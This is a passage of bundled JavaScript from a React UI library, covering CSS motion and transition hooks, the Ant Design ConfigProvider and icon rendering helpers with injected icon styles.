  STATUS_APPEAR = "appear",
  STATUS_ENTER = "enter",
  STATUS_LEAVE = "leave",
  STEP_NONE = "none",
  STEP_PREPARE = "prepare",
  STEP_START = "start",
  STEP_ACTIVE = "active",
  STEP_ACTIVATED = "end",
  STEP_PREPARED = "prepared";
function makePrefixMap(i, a) {
  var o = {};
  return (
    (o[i.toLowerCase()] = a.toLowerCase()),
    (o["Webkit".concat(i)] = "webkit".concat(a)),
    (o["Moz".concat(i)] = "moz".concat(a)),
    (o["ms".concat(i)] = "MS".concat(a)),
    (o["O".concat(i)] = "o".concat(a.toLowerCase())),
    o
  );
}
function getVendorPrefixes(i, a) {
  var o = {
    animationend: makePrefixMap("Animation", "AnimationEnd"),
    transitionend: makePrefixMap("Transition", "TransitionEnd"),
  };
  return (
    i &&
      ("AnimationEvent" in a || delete o.animationend.animation,
      "TransitionEvent" in a || delete o.transitionend.transition),
    o
  );
}
var vendorPrefixes = getVendorPrefixes(
    canUseDom(),
    typeof window < "u" ? window : {}
  ),
  style = {};
if (canUseDom()) {
  var _document$createEleme = document.createElement("div");
  style = _document$createEleme.style;
}
var prefixedEventNames = {};
function getVendorPrefixedEventName(i) {
  if (prefixedEventNames[i]) return prefixedEventNames[i];
  var a = vendorPrefixes[i];
  if (a)
    for (var o = Object.keys(a), s = o.length, tt = 0; tt < s; tt += 1) {
      var nt = o[tt];
      if (Object.prototype.hasOwnProperty.call(a, nt) && nt in style)
        return (prefixedEventNames[i] = a[nt]), prefixedEventNames[i];
    }
  return "";
}
var internalAnimationEndName = getVendorPrefixedEventName("animationend"),
  internalTransitionEndName = getVendorPrefixedEventName("transitionend"),
  supportTransition = !!(internalAnimationEndName && internalTransitionEndName),
  animationEndName = internalAnimationEndName || "animationend",
  transitionEndName = internalTransitionEndName || "transitionend";
function getTransitionName$1(i, a) {
  if (!i) return null;
  if (_typeof(i) === "object") {
    var o = a.replace(/-\w/g, function (s) {
      return s[1].toUpperCase();
    });
    return i[o];
  }
  return "".concat(i, "-").concat(a);
}
const useDomMotionEvents = function (i) {
  var a = reactExports.useRef();
  function o(tt) {
    tt &&
      (tt.removeEventListener(transitionEndName, i),
      tt.removeEventListener(animationEndName, i));
  }
  function s(tt) {
    a.current && a.current !== tt && o(a.current),
      tt &&
        tt !== a.current &&
        (tt.addEventListener(transitionEndName, i),
        tt.addEventListener(animationEndName, i),
        (a.current = tt));
  }
  return (
    reactExports.useEffect(function () {
      return function () {
        o(a.current);
      };
    }, []),
    [s, o]
  );
};
var useIsomorphicLayoutEffect = canUseDom()
  ? reactExports.useLayoutEffect
  : reactExports.useEffect;
const useNextFrame = function () {
  var i = reactExports.useRef(null);
  function a() {
    wrapperRaf.cancel(i.current);
  }
  function o(s) {
    var tt = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 2;
    a();
    var nt = wrapperRaf(function () {
      tt <= 1
        ? s({
            isCanceled: function () {
              return nt !== i.current;
            },
          })
        : o(s, tt - 1);
    });
    i.current = nt;
  }
  return (
    reactExports.useEffect(function () {
      return function () {
        a();
      };
    }, []),
    [o, a]
  );
};
var FULL_STEP_QUEUE = [STEP_PREPARE, STEP_START, STEP_ACTIVE, STEP_ACTIVATED],
  SIMPLE_STEP_QUEUE = [STEP_PREPARE, STEP_PREPARED],
  SkipStep = !1,
  DoStep = !0;
function isActive(i) {
  return i === STEP_ACTIVE || i === STEP_ACTIVATED;
}
const useStepQueue = function (i, a, o) {
  var s = useSafeState(STEP_NONE),
    tt = _slicedToArray$1(s, 2),
    nt = tt[0],
    ot = tt[1],
    st = useNextFrame(),
    ft = _slicedToArray$1(st, 2),
    ht = ft[0],
    gt = ft[1];
  function St() {
    ot(STEP_PREPARE, !0);
  }
  var vt = a ? SIMPLE_STEP_QUEUE : FULL_STEP_QUEUE;
  return (
    useIsomorphicLayoutEffect(
      function () {
        if (nt !== STEP_NONE && nt !== STEP_ACTIVATED) {
          var _t = vt.indexOf(nt),
            Et = vt[_t + 1],
            Ct = o(nt);
          Ct === SkipStep
            ? ot(Et, !0)
            : Et &&
              ht(function (Pt) {
                function bt() {
                  Pt.isCanceled() || ot(Et, !0);
                }
                Ct === !0 ? bt() : Promise.resolve(Ct).then(bt);
              });
        }
      },
      [i, nt]
    ),
    reactExports.useEffect(function () {
      return function () {
        gt();
      };
    }, []),
    [St, nt]
  );
};
function useStatus(i, a, o, s) {
  var tt = s.motionEnter,
    nt = tt === void 0 ? !0 : tt,
    ot = s.motionAppear,
    st = ot === void 0 ? !0 : ot,
    ft = s.motionLeave,
    ht = ft === void 0 ? !0 : ft,
    gt = s.motionDeadline,
    St = s.motionLeaveImmediately,
    vt = s.onAppearPrepare,
    _t = s.onEnterPrepare,
    Et = s.onLeavePrepare,
    Ct = s.onAppearStart,
    Pt = s.onEnterStart,
    bt = s.onLeaveStart,
    xt = s.onAppearActive,
    yt = s.onEnterActive,
    wt = s.onLeaveActive,
    $t = s.onAppearEnd,
    kt = s.onEnterEnd,
    Rt = s.onLeaveEnd,
    It = s.onVisibleChanged,
    Ot = useSafeState(),
    Nt = _slicedToArray$1(Ot, 2),
    zt = Nt[0],
    Bt = Nt[1],
    Wt = useSyncState(STATUS_NONE),
    Gt = _slicedToArray$1(Wt, 2),
    Vt = Gt[0],
    Mt = Gt[1],
    Ft = useSafeState(null),
    Tt = _slicedToArray$1(Ft, 2),
    At = Tt[0],
    Lt = Tt[1],
    jt = Vt(),
    Dt = reactExports.useRef(!1),
    Ut = reactExports.useRef(null);
  function Ht() {
    return o();
  }
  var Kt = reactExports.useRef(!1);
  function qt() {
    Mt(STATUS_NONE), Lt(null, !0);
  }
  var Qt = useEvent(function (or) {
      var mr = Vt();
      if (mr !== STATUS_NONE) {
        var Yt = Ht();
        if (!(or && !or.deadline && or.target !== Yt)) {
          var rr = Kt.current,
            ar;
          mr === STATUS_APPEAR && rr
            ? (ar = $t == null ? void 0 : $t(Yt, or))
            : mr === STATUS_ENTER && rr
            ? (ar = kt == null ? void 0 : kt(Yt, or))
            : mr === STATUS_LEAVE &&
              rr &&
              (ar = Rt == null ? void 0 : Rt(Yt, or)),
            rr && ar !== !1 && qt();
        }
      }
    }),
    Zt = useDomMotionEvents(Qt),
    Jt = _slicedToArray$1(Zt, 1),
    er = Jt[0],
    sr = function (mr) {
      switch (mr) {
        case STATUS_APPEAR:
          return _defineProperty$1(
            _defineProperty$1(
              _defineProperty$1({}, STEP_PREPARE, vt),
              STEP_START,
              Ct
            ),
            STEP_ACTIVE,
            xt
          );
        case STATUS_ENTER:
          return _defineProperty$1(
            _defineProperty$1(
              _defineProperty$1({}, STEP_PREPARE, _t),
              STEP_START,
              Pt
            ),
            STEP_ACTIVE,
            yt
          );
        case STATUS_LEAVE:
          return _defineProperty$1(
            _defineProperty$1(
              _defineProperty$1({}, STEP_PREPARE, Et),
              STEP_START,
              bt
            ),
            STEP_ACTIVE,
            wt
          );
        default:
          return {};
      }
    },
    nr = reactExports.useMemo(
      function () {
        return sr(jt);
      },
      [jt]
    ),
    tr = useStepQueue(jt, !i, function (or) {
      if (or === STEP_PREPARE) {
        var mr = nr[STEP_PREPARE];
        return mr ? mr(Ht()) : SkipStep;
      }
      if (cr in nr) {
        var Yt;
        Lt(
          ((Yt = nr[cr]) === null || Yt === void 0
            ? void 0
            : Yt.call(nr, Ht(), null)) || null
        );
      }
      return (
        cr === STEP_ACTIVE &&
          jt !== STATUS_NONE &&
          (er(Ht()),
          gt > 0 &&
            (clearTimeout(Ut.current),
            (Ut.current = setTimeout(function () {
              Qt({ deadline: !0 });
            }, gt)))),
        cr === STEP_PREPARED && qt(),
        DoStep
      );
    }),
    Xt = _slicedToArray$1(tr, 2),
    hr = Xt[0],
    cr = Xt[1],
    yr = isActive(cr);
  Kt.current = yr;
  var vr = reactExports.useRef(null);
  useIsomorphicLayoutEffect(
    function () {
      if (!(Dt.current && vr.current === a)) {
        Bt(a);
        var or = Dt.current;
        Dt.current = !0;
        var mr;
        !or && a && st && (mr = STATUS_APPEAR),
          or && a && nt && (mr = STATUS_ENTER),
          ((or && !a && ht) || (!or && St && !a && ht)) && (mr = STATUS_LEAVE);
        var Yt = sr(mr);
        mr && (i || Yt[STEP_PREPARE]) ? (Mt(mr), hr()) : Mt(STATUS_NONE),
          (vr.current = a);
      }
    },
    [a]
  ),
    reactExports.useEffect(
      function () {
        ((jt === STATUS_APPEAR && !st) ||
          (jt === STATUS_ENTER && !nt) ||
          (jt === STATUS_LEAVE && !ht)) &&
          Mt(STATUS_NONE);
      },
      [st, nt, ht]
    ),
    reactExports.useEffect(function () {
      return function () {
        (Dt.current = !1), clearTimeout(Ut.current);
      };
    }, []);
  var xr = reactExports.useRef(!1);
  reactExports.useEffect(
    function () {
      zt && (xr.current = !0),
        zt !== void 0 &&
          jt === STATUS_NONE &&
          ((xr.current || zt) && (It == null || It(zt)), (xr.current = !0));
    },
    [zt, jt]
  );
  var Sr = At;
  return (
    nr[STEP_PREPARE] &&
      cr === STEP_START &&
      (Sr = _objectSpread2$1({ transition: "none" }, Sr)),
    [jt, cr, Sr, zt ?? a]
  );
}
function genCSSMotion(i) {
  var a = i;
  _typeof(i) === "object" && (a = i.transitionSupport);
  function o(tt, nt) {
    return !!(tt.motionName && a && nt !== !1);
  }
  var s = reactExports.forwardRef(function (tt, nt) {
    var ot = tt.visible,
      st = ot === void 0 ? !0 : ot,
      ft = tt.removeOnLeave,
      ht = ft === void 0 ? !0 : ft,
      gt = tt.forceRender,
      St = tt.children,
      vt = tt.motionName,
      _t = tt.leavedClassName,
      Et = tt.eventProps,
      Ct = reactExports.useContext(Context$1),
      Pt = Ct.motion,
      bt = o(tt, Pt),
      xt = reactExports.useRef(),
      yt = reactExports.useRef();
    function wt() {
      try {
        return xt.current instanceof HTMLElement
          ? xt.current
          : findDOMNode(yt.current);
      } catch {
        return null;
      }
    }
    var $t = useStatus(bt, st, wt, tt),
      kt = _slicedToArray$1($t, 4),
      Rt = kt[0],
      It = kt[1],
      Ot = kt[2],
      Nt = kt[3],
      zt = reactExports.useRef(Nt);
    Nt && (zt.current = !0);
    var Bt = reactExports.useCallback(
        function (Tt) {
          (xt.current = Tt), fillRef(nt, Tt);
        },
        [nt]
      ),
      Wt,
      Gt = _objectSpread2$1(_objectSpread2$1({}, Et), {}, { visible: st });
    if (!St) Wt = null;
    else if (Rt === STATUS_NONE)
      Nt
        ? (Wt = St(_objectSpread2$1({}, Gt), Bt))
        : !ht && zt.current && _t
        ? (Wt = St(
            _objectSpread2$1(_objectSpread2$1({}, Gt), {}, { className: _t }),
            Bt
          ))
        : gt || (!ht && !_t)
        ? (Wt = St(
            _objectSpread2$1(
              _objectSpread2$1({}, Gt),
              {},
              { style: { display: "none" } }
            ),
            Bt
          ))
        : (Wt = null);
    else {
      var Vt;
      It === STEP_PREPARE
        ? (Vt = "prepare")
        : isActive(It)
        ? (Vt = "active")
        : It === STEP_START && (Vt = "start");
      var Mt = getTransitionName$1(vt, "".concat(Rt, "-").concat(Vt));
      Wt = St(
        _objectSpread2$1(
          _objectSpread2$1({}, Gt),
          {},
          {
            className: classNames(
              getTransitionName$1(vt, Rt),
              _defineProperty$1(
                _defineProperty$1({}, Mt, Mt && Vt),
                vt,
                typeof vt == "string"
              )
            ),
            style: Ot,
          }
        ),
        Bt
      );
    }
    if (reactExports.isValidElement(Wt) && supportRef(Wt)) {
      var Ft = getNodeRef(Wt);
      Ft || (Wt = reactExports.cloneElement(Wt, { ref: Bt }));
    }
    return reactExports.createElement(DomWrapper, { ref: yt }, Wt);
  });
  return (s.displayName = "CSSMotion"), s;
}
const CSSMotion = genCSSMotion(supportTransition);
var STATUS_ADD = "add",
  STATUS_KEEP = "keep",
  STATUS_REMOVE = "remove",
  STATUS_REMOVED = "removed";
function wrapKeyToObject(i) {
  var a;
  return (
    i && _typeof(i) === "object" && "key" in i ? (a = i) : (a = { key: i }),
    _objectSpread2$1(_objectSpread2$1({}, a), {}, { key: String(a.key) })
  );
}
function parseKeys() {
  var i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : [];
  return i.map(wrapKeyToObject);
}
function diffKeys() {
  var i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : [],
    a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : [],
    o = [],
    s = 0,
    tt = a.length,
    nt = parseKeys(i),
    ot = parseKeys(a);
  nt.forEach(function (ht) {
    for (var gt = !1, St = s; St < tt; St += 1) {
      var vt = ot[St];
      if (vt.key === ht.key) {
        s < St &&
          ((o = o.concat(
            ot.slice(s, St).map(function (_t) {
              return _objectSpread2$1(
                _objectSpread2$1({}, _t),
                {},
                { status: STATUS_ADD }
              );
            })
          )),
          (s = St)),
          o.push(
            _objectSpread2$1(
              _objectSpread2$1({}, vt),
              {},
              { status: STATUS_KEEP }
            )
          ),
          (s += 1),
          (gt = !0);
        break;
      }
    }
    gt ||
      o.push(
        _objectSpread2$1(
          _objectSpread2$1({}, ht),
          {},
          { status: STATUS_REMOVE }
        )
      );
  }),
    s < tt &&
      (o = o.concat(
        ot.slice(s).map(function (ht) {
          return _objectSpread2$1(
            _objectSpread2$1({}, ht),
            {},
            { status: STATUS_ADD }
          );
        })
      ));
  var st = {};
  o.forEach(function (ht) {
    var gt = ht.key;
    st[gt] = (st[gt] || 0) + 1;
  });
  var ft = Object.keys(st).filter(function (ht) {
    return st[ht] > 1;
  });
  return (
    ft.forEach(function (ht) {
      (o = o.filter(function (gt) {
        var St = gt.key,
          vt = gt.status;
        return St !== ht || vt !== STATUS_REMOVE;
      })),
        o.forEach(function (gt) {
          gt.key === ht && (gt.status = STATUS_KEEP);
        });
    }),
    o
  );
}
var _excluded$g = ["component", "children", "onVisibleChanged", "onAllRemoved"],
  _excluded2$1 = ["status"],
  MOTION_PROP_NAMES = [
    "eventProps",
    "visible",
    "children",
    "motionName",
    "motionAppear",
    "motionEnter",
    "motionLeave",
    "motionLeaveImmediately",
    "motionDeadline",
    "removeOnLeave",
    "leavedClassName",
    "onAppearPrepare",
    "onAppearStart",
    "onAppearActive",
    "onAppearEnd",
    "onEnterStart",
    "onEnterActive",
    "onEnterEnd",
    "onLeaveStart",
    "onLeaveActive",
    "onLeaveEnd",
  ];
function genCSSMotionList(i) {
  var a =
      arguments.length > 1 && arguments[1] !== void 0
        ? arguments[1]
        : CSSMotion,
    o = (function (s) {
      _inherits(nt, s);
      var tt = _createSuper(nt);
      function nt() {
        var ot;
        _classCallCheck(this, nt);
        for (
          var st = arguments.length, ft = new Array(st), ht = 0;
          ht < st;
          ht++
        )
          ft[ht] = arguments[ht];
        return (
          (ot = tt.call.apply(tt, [this].concat(ft))),
          _defineProperty$1(_assertThisInitialized(ot), "state", {
            keyEntities: [],
          }),
          _defineProperty$1(
            _assertThisInitialized(ot),
            "removeKey",
            function (gt) {
              ot.setState(
                function (St) {
                  var vt = St.keyEntities.map(function (_t) {
                    return _t.key !== gt
                      ? _t
                      : _objectSpread2$1(
                          _objectSpread2$1({}, _t),
                          {},
                          { status: STATUS_REMOVED }
                        );
                  });
                  return { keyEntities: vt };
                },
                function () {
                  var St = ot.state.keyEntities,
                    vt = St.filter(function (_t) {
                      var Et = _t.status;
                      return Et !== STATUS_REMOVED;
                    }).length;
                  vt === 0 && ot.props.onAllRemoved && ot.props.onAllRemoved();
                }
              );
            }
          ),
          ot
        );
      }
      return (
        _createClass(
          nt,
          [
            {
              key: "render",
              value: function () {
                var st = this,
                  ft = this.state.keyEntities,
                  ht = this.props,
                  gt = ht.component,
                  St = ht.children,
                  vt = ht.onVisibleChanged;
                ht.onAllRemoved;
                var _t = _objectWithoutProperties$1(ht, _excluded$g),
                  Et = gt || reactExports.Fragment,
                  Ct = {};
                return (
                  MOTION_PROP_NAMES.forEach(function (Pt) {
                    (Ct[Pt] = _t[Pt]), delete _t[Pt];
                  }),
                  delete _t.keys,
                  reactExports.createElement(
                    Et,
                    _t,
                    ft.map(function (Pt, bt) {
                      var xt = Pt.status,
                        yt = _objectWithoutProperties$1(Pt, _excluded2$1),
                        wt = xt === STATUS_ADD || xt === STATUS_KEEP;
                      return reactExports.createElement(
                        a,
                        _extends({}, Ct, {
                          key: yt.key,
                          visible: wt,
                          eventProps: yt,
                          onVisibleChanged: function (kt) {
                            vt == null || vt(kt, { key: yt.key }),
                              kt || st.removeKey(yt.key);
                          },
                        }),
                        function ($t, kt) {
                          return St(
                            _objectSpread2$1(
                              _objectSpread2$1({}, $t),
                              {},
                              { index: bt }
                            ),
                            kt
                          );
                        }
                      );
                    })
                  )
                );
              },
            },
          ],
          [
            {
              key: "getDerivedStateFromProps",
              value: function (st, ft) {
                var ht = st.keys,
                  gt = ft.keyEntities,
                  St = parseKeys(ht),
                  vt = diffKeys(gt, St);
                return {
                  keyEntities: vt.filter(function (_t) {
                    var Et = gt.find(function (Ct) {
                      var Pt = Ct.key;
                      return _t.key === Pt;
                    });
                    return !(
                      Et &&
                      Et.status === STATUS_REMOVED &&
                      _t.status === STATUS_REMOVE
                    );
                  }),
                };
              },
            },
          ]
        ),
        nt
      );
    })(reactExports.Component);
  return _defineProperty$1(o, "defaultProps", { component: "div" }), o;
}
const CSSMotionList = genCSSMotionList(supportTransition);
function MotionWrapper(i) {
  const { children: a } = i,
    [, o] = useToken(),
    { motion: s } = o,
    tt = reactExports.useRef(!1);
  return (
    (tt.current = tt.current || s === !1),
    tt.current
      ? reactExports.createElement(MotionProvider, { motion: s }, a)
      : a
  );
}
const PropWarning = () => null;
var __rest$c = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const PASSED_PROPS = [
  "getTargetContainer",
  "getPopupContainer",
  "renderEmpty",
  "input",
  "pagination",
  "form",
  "select",
  "button",
];
let globalPrefixCls, globalIconPrefixCls, globalTheme, globalHolderRender;
function getGlobalPrefixCls() {
  return globalPrefixCls || defaultPrefixCls;
}
function getGlobalIconPrefixCls() {
  return globalIconPrefixCls || defaultIconPrefixCls;
}
function isLegacyTheme(i) {
  return Object.keys(i).some((a) => a.endsWith("Color"));
}
const setGlobalConfig = (i) => {
    const { prefixCls: a, iconPrefixCls: o, theme: s, holderRender: tt } = i;
    a !== void 0 && (globalPrefixCls = a),
      o !== void 0 && (globalIconPrefixCls = o),
      "holderRender" in i && (globalHolderRender = tt),
      s &&
        (isLegacyTheme(s)
          ? registerTheme(getGlobalPrefixCls(), s)
          : (globalTheme = s));
  },
  globalConfig = () => ({
    getPrefixCls: (i, a) =>
      a || (i ? `${getGlobalPrefixCls()}-${i}` : getGlobalPrefixCls()),
    getIconPrefixCls: getGlobalIconPrefixCls,
    getRootPrefixCls: () => globalPrefixCls || getGlobalPrefixCls(),
    getTheme: () => globalTheme,
    holderRender: globalHolderRender,
  }),
  ProviderChildren = (i) => {
    const {
        children: a,
        csp: o,
        autoInsertSpaceInButton: s,
        alert: tt,
        anchor: nt,
        form: ot,
        locale: st,
        componentSize: ft,
        direction: ht,
        space: gt,
        splitter: St,
        virtual: vt,
        dropdownMatchSelectWidth: _t,
        popupMatchSelectWidth: Et,
        popupOverflow: Ct,
        legacyLocale: Pt,
        parentContext: bt,
        iconPrefixCls: xt,
        theme: yt,
        componentDisabled: wt,
        segmented: $t,
        statistic: kt,
        spin: Rt,
        calendar: It,
        carousel: Ot,
        cascader: Nt,
        collapse: zt,
        typography: Bt,
        checkbox: Wt,
        descriptions: Gt,
        divider: Vt,
        drawer: Mt,
        skeleton: Ft,
        steps: Tt,
        image: At,
        layout: Lt,
        list: jt,
        mentions: Dt,
        modal: Ut,
        progress: Ht,
        result: Kt,
        slider: qt,
        breadcrumb: Qt,
        menu: Zt,
        pagination: Jt,
        input: er,
        textArea: sr,
        empty: nr,
        badge: tr,
        radio: Xt,
        rate: hr,
        switch: cr,
        transfer: yr,
        avatar: vr,
        message: xr,
        tag: Sr,
        table: or,
        card: mr,
        tabs: Yt,
        timeline: rr,
        timePicker: ar,
        upload: gr,
        notification: br,
        tree: Cr,
        colorPicker: Rr,
        datePicker: Ar,
        rangePicker: Ur,
        flex: Ir,
        wave: ur,
        dropdown: lr,
        warning: Fr,
        tour: Vr,
        floatButtonGroup: Hr,
        variant: qr,
        inputNumber: Cn,
        treeSelect: dn,
      } = i,
      hn = reactExports.useCallback(
        (wr, Er) => {
          const { prefixCls: Br } = i;
          if (Er) return Er;
          const Lr = Br || bt.getPrefixCls("");
          return wr ? `${Lr}-${wr}` : Lr;
        },
        [bt.getPrefixCls, i.prefixCls]
      ),
      on = xt || bt.iconPrefixCls || defaultIconPrefixCls,
      Nr = o || bt.csp;
    useResetIconStyle(on, Nr);
    const jr = useTheme(yt, bt.theme, { prefixCls: hn("") }),
      Zr = {
        csp: Nr,
        autoInsertSpaceInButton: s,
        alert: tt,
        anchor: nt,
        locale: st || Pt,
        direction: ht,
        space: gt,
        splitter: St,
        virtual: vt,
        popupMatchSelectWidth: Et ?? _t,
        popupOverflow: Ct,
        getPrefixCls: hn,
        iconPrefixCls: on,
        theme: jr,
        segmented: $t,
        statistic: kt,
        spin: Rt,
        calendar: It,
        carousel: Ot,
        cascader: Nt,
        collapse: zt,
        typography: Bt,
        checkbox: Wt,
        descriptions: Gt,
        divider: Vt,
        drawer: Mt,
        skeleton: Ft,
        steps: Tt,
        image: At,
        input: er,
        textArea: sr,
        layout: Lt,
        list: jt,
        mentions: Dt,
        modal: Ut,
        progress: Ht,
        result: Kt,
        slider: qt,
        breadcrumb: Qt,
        menu: Zt,
        pagination: Jt,
        empty: nr,
        badge: tr,
        radio: Xt,
        rate: hr,
        switch: cr,
        transfer: yr,
        avatar: vr,
        message: xr,
        tag: Sr,
        table: or,
        card: mr,
        tabs: Yt,
        timeline: rr,
        timePicker: ar,
        upload: gr,
        notification: br,
        tree: Cr,
        colorPicker: Rr,
        datePicker: Ar,
        rangePicker: Ur,
        flex: Ir,
        wave: ur,
        dropdown: lr,
        warning: Fr,
        tour: Vr,
        floatButtonGroup: Hr,
        variant: qr,
        inputNumber: Cn,
        treeSelect: dn,
      },
      Tr = Object.assign({}, bt);
    Object.keys(Zr).forEach((wr) => {
      Zr[wr] !== void 0 && (Tr[wr] = Zr[wr]);
    }),
      PASSED_PROPS.forEach((wr) => {
        const Er = i[wr];
        Er && (Tr[wr] = Er);
      }),
      typeof s < "u" &&
        (Tr.button = Object.assign({ autoInsertSpace: s }, Tr.button));
    const Dr = useMemo(
        () => Tr,
        Tr,
        (wr, Er) => {
          const Br = Object.keys(wr),
            Lr = Object.keys(Er);
          return Br.length !== Lr.length || Br.some((Wr) => wr[Wr] !== Er[Wr]);
        }
      ),
      _r = reactExports.useMemo(() => ({ prefixCls: on, csp: Nr }), [on, Nr]);
    let pr = reactExports.createElement(
      reactExports.Fragment,
      null,
      reactExports.createElement(PropWarning, { dropdownMatchSelectWidth: _t }),
      a
    );
    const Gr = reactExports.useMemo(() => {
      var wr, Er, Br, Lr;
      return merge$1(
        ((wr = localeValues.Form) === null || wr === void 0
          ? void 0
          : wr.defaultValidateMessages) || {},
        ((Br =
          (Er = Dr.locale) === null || Er === void 0 ? void 0 : Er.Form) ===
          null || Br === void 0
          ? void 0
          : Br.defaultValidateMessages) || {},
        ((Lr = Dr.form) === null || Lr === void 0
          ? void 0
          : Lr.validateMessages) || {},
        (ot == null ? void 0 : ot.validateMessages) || {}
      );
    }, [Dr, ot == null ? void 0 : ot.validateMessages]);
    Object.keys(Gr).length > 0 &&
      (pr = reactExports.createElement(
        ValidateMessagesContext.Provider,
        { value: Gr },
        pr
      )),
      st &&
        (pr = reactExports.createElement(
          LocaleProvider,
          { locale: st, _ANT_MARK__: ANT_MARK },
          pr
        )),
      (pr = reactExports.createElement(
        IconContext.Provider,
        { value: _r },
        pr
      )),
      ft &&
        (pr = reactExports.createElement(
          SizeContextProvider,
          { size: ft },
          pr
        )),
      (pr = reactExports.createElement(MotionWrapper, null, pr));
    const Jr = reactExports.useMemo(() => {
      const wr = jr || {},
        { algorithm: Er, token: Br, components: Lr, cssVar: Wr } = wr,
        pn = __rest$c(wr, ["algorithm", "token", "components", "cssVar"]),
        mn =
          Er && (!Array.isArray(Er) || Er.length > 0)
            ? createTheme(Er)
            : defaultTheme,
        en = {};
      Object.entries(Lr || {}).forEach((ln) => {
        let [rn, nn] = ln;
        const Mr = Object.assign({}, nn);
        "algorithm" in Mr &&
          (Mr.algorithm === !0
            ? (Mr.theme = mn)
            : (Array.isArray(Mr.algorithm) ||
                typeof Mr.algorithm == "function") &&
              (Mr.theme = createTheme(Mr.algorithm)),
          delete Mr.algorithm),
          (en[rn] = Mr);
      });
      const tn = Object.assign(Object.assign({}, seedToken), Br);
      return Object.assign(Object.assign({}, pn), {
        theme: mn,
        token: tn,
        components: en,
        override: Object.assign({ override: tn }, en),
        cssVar: Wr,
      });
    }, [jr]);
    return (
      yt &&
        (pr = reactExports.createElement(
          DesignTokenContext.Provider,
          { value: Jr },
          pr
        )),
      Dr.warning &&
        (pr = reactExports.createElement(
          WarningContext.Provider,
          { value: Dr.warning },
          pr
        )),
      wt !== void 0 &&
        (pr = reactExports.createElement(
          DisabledContextProvider,
          { disabled: wt },
          pr
        )),
      reactExports.createElement(ConfigContext.Provider, { value: Dr }, pr)
    );
  },
  ConfigProvider = (i) => {
    const a = reactExports.useContext(ConfigContext),
      o = reactExports.useContext(LocaleContext);
    return reactExports.createElement(
      ProviderChildren,
      Object.assign({ parentContext: a, legacyLocale: o }, i)
    );
  };
ConfigProvider.ConfigContext = ConfigContext;
ConfigProvider.SizeContext = SizeContext;
ConfigProvider.config = setGlobalConfig;
ConfigProvider.useConfig = useConfig;
Object.defineProperty(ConfigProvider, "SizeContext", {
  get: () => SizeContext,
});
var CheckCircleFilled$1 = {
  icon: {
    tag: "svg",
    attrs: { viewBox: "64 64 896 896", focusable: "false" },
    children: [
      {
        tag: "path",
        attrs: {
          d: "M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm193.5 301.7l-210.6 292a31.8 31.8 0 01-51.7 0L318.5 484.9c-3.8-5.3 0-12.7 6.5-12.7h46.9c10.2 0 19.9 4.9 25.9 13.3l71.2 98.8 157.2-218c6-8.3 15.6-13.3 25.9-13.3H699c6.5 0 10.3 7.4 6.5 12.7z",
        },
      },
    ],
  },
  name: "check-circle",
  theme: "filled",
};
function getRoot(i) {
  var a;
  return i == null || (a = i.getRootNode) === null || a === void 0
    ? void 0
    : a.call(i);
}
function inShadow(i) {
  return getRoot(i) instanceof ShadowRoot;
}
function getShadowRoot(i) {
  return inShadow(i) ? getRoot(i) : null;
}
function camelCase(i) {
  return i.replace(/-(.)/g, function (a, o) {
    return o.toUpperCase();
  });
}
function warning$1(i, a) {
  warningOnce(i, "[@ant-design/icons] ".concat(a));
}
function isIconDefinition(i) {
  return (
    _typeof(i) === "object" &&
    typeof i.name == "string" &&
    typeof i.theme == "string" &&
    (_typeof(i.icon) === "object" || typeof i.icon == "function")
  );
}
function normalizeAttrs() {
  var i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
  return Object.keys(i).reduce(function (a, o) {
    var s = i[o];
    switch (o) {
      case "class":
        (a.className = s), delete a.class;
        break;
      default:
        delete a[o], (a[camelCase(o)] = s);
    }
    return a;
  }, {});
}
function generate(i, a, o) {
  return o
    ? React$1.createElement(
        i.tag,
        _objectSpread2$1(
          _objectSpread2$1({ key: a }, normalizeAttrs(i.attrs)),
          o
        ),
        (i.children || []).map(function (s, tt) {
          return generate(s, "".concat(a, "-").concat(i.tag, "-").concat(tt));
        })
      )
    : React$1.createElement(
        i.tag,
        _objectSpread2$1({ key: a }, normalizeAttrs(i.attrs)),
        (i.children || []).map(function (s, tt) {
          return generate(s, "".concat(a, "-").concat(i.tag, "-").concat(tt));
        })
      );
}
function getSecondaryColor(i) {
  return generate$1(i)[0];
}
function normalizeTwoToneColors(i) {
  return i ? (Array.isArray(i) ? i : [i]) : [];
}
var iconStyles = `
.anticon {
  display: inline-flex;
  align-items: center;
  color: inherit;
  font-style: normal;
  line-height: 0;
  text-align: center;
  text-transform: none;
  vertical-align: -0.125em;
  text-rendering: optimizeLegibility;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

.anticon > * {
  line-height: 1;
}

.anticon svg {
  display: inline-block;
}

.anticon::before {
  display: none;
}

.anticon .anticon-icon {
  display: block;
}

.anticon[tabindex] {
  cursor: pointer;
}

.anticon-spin::before,
.anticon-spin {
  display: inline-block;
  -webkit-animation: loadingCircle 1s infinite linear;
  animation: loadingCircle 1s infinite linear;
}

@-webkit-keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}

@keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
`,
  useInsertStyles = function (a) {
    var o = reactExports.useContext(IconContext),
      s = o.csp,
      tt = o.prefixCls,
      nt = iconStyles;
    tt && (nt = nt.replace(/anticon/g, tt)),
      reactExports.useEffect(function () {
        var ot = a.current,
          st = getShadowRoot(ot);
        updateCSS(nt, "@ant-design-icons", {
          prepend: !0,
          csp: s,
          attachTo: st,
        });
      }, []);
  },
  _excluded$f = [
    "icon",
    "className",
    "onClick",
    "style",
    "primaryColor",
    "secondaryColor",
  ],
  twoToneColorPalette = {
    primaryColor: "#333",
